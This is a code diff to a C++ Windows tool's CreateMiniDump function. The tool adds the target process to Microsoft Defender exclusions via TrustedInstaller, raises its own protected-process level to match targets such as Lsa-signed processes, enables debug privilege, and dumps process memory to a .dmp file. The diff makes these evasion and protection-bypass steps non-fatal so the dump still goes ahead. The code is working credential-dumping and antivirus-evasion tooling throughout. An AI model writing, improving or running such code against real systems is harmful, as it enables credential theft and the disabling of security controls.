@@ -80,12 +80,15 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
     
     std::wstring processName = Utils::GetProcessName(pid);
 
-    // Add process to Defender exclusions to prevent interference during dumping
-	std::wstring processNameWithExt = processName;
-	if (processNameWithExt.find(L".exe") == std::wstring::npos) {
-		processNameWithExt += L".exe";
-	}
-    m_trustedInstaller.AddProcessToDefenderExclusions(processName);
+    // Try to add process to Defender exclusions to prevent interference during dumping
+    std::wstring processNameWithExt = processName;
+    if (processNameWithExt.find(L".exe") == std::wstring::npos) {
+        processNameWithExt += L".exe";
+    }
+    
+    if (!m_trustedInstaller.AddProcessToDefenderExclusions(processName)) {
+        INFO(L"AV exclusion skipped: %s", processName.c_str());
+    }
 
     // System process validation - these processes cannot be dumped
     if (pid == 4 || processName == L"System") {
@@ -128,21 +131,18 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
         return false;
     }
 
-    // Get target process protection level for elevation
+    // Get target process protection level for elevation - this is auxiliary
     auto kernelAddr = GetProcessKernelAddress(pid);
     if (!kernelAddr) {
-        ERROR(L"Failed to get kernel address for target process");
-        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
-        PerformAtomicCleanup();
-        return false;
+        INFO(L"Could not get kernel address for target process (continuing without self-protection)");
     }
 
-    auto targetProtection = GetProcessProtection(kernelAddr.value());
-    if (!targetProtection) {
-        ERROR(L"Failed to get protection info for target process");
-        m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
-        PerformAtomicCleanup();
-        return false;
+    auto targetProtection = std::optional<UCHAR>{};
+    if (kernelAddr) {
+        targetProtection = GetProcessProtection(kernelAddr.value());
+        if (!targetProtection) {
+            INFO(L"Could not get protection info for target process (continuing without self-protection)");
+        }
     }
 
     if (g_interrupted) {
@@ -152,13 +152,13 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
         return false;
     }
 
-    // Protection elevation to match target process level
-    if (targetProtection.value() > 0) {
+    // Protection elevation to match target process level - auxiliary feature
+    if (targetProtection && targetProtection.value() > 0) {
         UCHAR targetLevel = Utils::GetProtectionLevel(targetProtection.value());
         UCHAR targetSigner = Utils::GetSignerType(targetProtection.value());
 
         std::wstring levelStr = (targetLevel == static_cast<UCHAR>(PS_PROTECTED_TYPE::Protected)) ? L"PP" : L"PPL";
-        std::wstring signerStr;
+        std::wstring signerStr = L"Unknown";
 
         switch (static_cast<PS_PROTECTED_SIGNER>(targetSigner)) {
             case PS_PROTECTED_SIGNER::Lsa: signerStr = L"Lsa"; break;
@@ -170,25 +170,26 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
             case PS_PROTECTED_SIGNER::CodeGen: signerStr = L"CodeGen"; break;
             case PS_PROTECTED_SIGNER::App: signerStr = L"App"; break;
             default: 
-                ERROR(L"Unknown signer type for target process");
-                m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
-                PerformAtomicCleanup();
-                return false;
+                INFO(L"Unknown signer type - skipping self-protection");
+                break;
         }
 
-        INFO(L"Target process protection: %s-%s", levelStr.c_str(), signerStr.c_str());
+        if (signerStr != L"Unknown") {
+            INFO(L"Target process protection: %s-%s", levelStr.c_str(), signerStr.c_str());
 
-        if (!SelfProtect(levelStr, signerStr)) {
-            ERROR(L"Failed to set self protection to %s-%s", levelStr.c_str(), signerStr.c_str());
-        } else {
-            SUCCESS(L"Set self protection to %s-%s", levelStr.c_str(), signerStr.c_str());
+            if (!SelfProtect(levelStr, signerStr)) {
+                INFO(L"Self-protection failed: %s-%s (continuing with dump)", levelStr.c_str(), signerStr.c_str());
+            } else {
+                SUCCESS(L"Self-protection set to %s-%s", levelStr.c_str(), signerStr.c_str());
+            }
         }
     } else {
         INFO(L"Target process is not protected, no self-protection needed");
     }
 
+    // Try to enable debug privilege - auxiliary feature
     if (!EnableDebugPrivilege()) {
-        ERROR(L"Failed to enable debug privilege");
+        INFO(L"Debug privilege failed (continuing with dump anyway)");
     }
 
     if (g_interrupted) {
@@ -199,12 +200,12 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
         return false;
     }
 
-    // Open target process with appropriate privileges
+    // Open target process with appropriate privileges - CRITICAL operation
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) {
         hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
         if (!hProcess) {
-            ERROR(L"Failed to open process (error: %d)", GetLastError());
+            ERROR(L"Critical: Failed to open process (error: %d)", GetLastError());
             m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
             PerformAtomicCleanup();
             return false;
@@ -217,9 +218,10 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
         fullPath += L"\\";
     fullPath += processName + L"_" + std::to_wstring(pid) + L".dmp";
 
+    // Create dump file - CRITICAL operation
     HANDLE hFile = CreateFileW(fullPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        ERROR(L"Failed to create dump file (error: %d)", GetLastError());
+        ERROR(L"Critical: Failed to create dump file (error: %d)", GetLastError());
         CloseHandle(hProcess);
         m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
         PerformAtomicCleanup();
@@ -249,6 +251,7 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
 
     INFO(L"Creating memory dump - this may take a while. Press Ctrl+C to cancel safely.");
     
+    // Execute the actual memory dump - CRITICAL operation
     BOOL result = MiniDumpWriteDump(hProcess, pid, hFile, dumpType, NULL, NULL, NULL);
     
     if (g_interrupted) {
@@ -269,19 +272,19 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
         DWORD error = GetLastError();
         switch (error) {
             case ERROR_TIMEOUT:
-                ERROR(L"MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
+                ERROR(L"Critical: MiniDumpWriteDump timed out - process may be unresponsive or in critical section");
                 break;
             case RPC_S_CALL_FAILED:
-                ERROR(L"RPC call failed - process may be a kernel-mode or system-critical process");
+                ERROR(L"Critical: RPC call failed - process may be a kernel-mode or system-critical process");
                 break;
             case ERROR_ACCESS_DENIED:
-                ERROR(L"Access denied - insufficient privileges even with protection bypass");
+                ERROR(L"Critical: Access denied - insufficient privileges even with protection bypass");
                 break;
             case ERROR_PARTIAL_COPY:
-                ERROR(L"Partial copy - some memory regions could not be read");
+                ERROR(L"Critical: Partial copy - some memory regions could not be read");
                 break;
             default:
-                ERROR(L"MiniDumpWriteDump failed (error: %d / 0x%08x)", error, error);
+                ERROR(L"Critical: MiniDumpWriteDump failed (error: %d / 0x%08x)", error, error);
                 break;
         }
         DeleteFileW(fullPath.c_str());
@@ -293,8 +296,11 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
 
     SUCCESS(L"Memory dump created successfully: %s", fullPath.c_str());
     
+    // Cleanup phase - these operations are non-critical
     INFO(L"Removing self-protection before cleanup...");
-    SelfProtect(L"none", L"none");
+    if (!SelfProtect(L"none", L"none")) {
+        DEBUG(L"Self-protection removal failed (non-critical)");
+    }
     
     if (g_interrupted) {
         INFO(L"Operation completed but cleanup was interrupted");
@@ -303,8 +309,11 @@ bool Controller::CreateMiniDump(DWORD pid, const std::wstring& outputPath) noexc
         return true;
     }
     
-    // Clean up Defender exclusions and perform atomic cleanup
-    m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName);
+    // Clean up Defender exclusions and perform atomic cleanup - non-critical
+    if (!m_trustedInstaller.RemoveProcessFromDefenderExclusions(processName)) {
+        DEBUG(L"AV cleanup skipped: %s", processName.c_str());
+    }
+    
     PerformAtomicCleanup();
     
     return true;
